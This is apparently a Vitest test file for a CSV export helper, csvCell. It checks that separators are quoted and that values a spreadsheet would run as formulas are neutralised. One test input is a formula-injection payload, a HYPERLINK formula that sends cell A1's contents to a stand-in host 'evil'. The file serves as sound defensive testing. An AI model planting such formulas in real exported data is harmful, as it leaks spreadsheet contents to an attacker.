// CSV export cells (spec 008b): quoting and formula-injection neutralising.
import { describe, expect, it } from "vitest";
import { csvCell } from "../../src/routes/conversations.ts";

describe("csvCell", () => {
  it("leaves plain values alone and quotes separators", () => {
    expect(csvCell("hello")).toBe("hello");
    expect(csvCell(null)).toBe("");
    expect(csvCell(3)).toBe("3");
    expect(csvCell('a, "b"')).toBe('"a, ""b"""');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("prefixes values that a spreadsheet would run as a formula", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+1")).toBe("'+1");
    expect(csvCell("-2")).toBe("'-2");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
    expect(csvCell("\rx")).toBe('"\'\rx"');
    expect(csvCell('=HYPERLINK("https://evil/?"&A1,"click")')).toBe(
      '"\'=HYPERLINK(""https://evil/?""&A1,""click"")"',
    );
    expect(csvCell("a=b")).toBe("a=b");
    expect(csvCell("  =1+1")).toBe("'  =1+1");
    expect(csvCell("\uff1d1+1")).toBe("'\uff1d1+1");
    expect(csvCell("\n=1")).toBe('"\'\n=1"');
  });

  it("leaves numbers, booleans and dates as values", () => {
    expect(csvCell(-0.5)).toBe("-0.5");
    expect(csvCell(true)).toBe("true");
    expect(csvCell(new Date("2026-11-01T00:00:00Z"))).toBe("2026-11-01T00:00:00.000Z");
    expect(csvCell([{ item_id: "x" }])).toBe('"[{""item_id"":""x""}]"');
  });
});
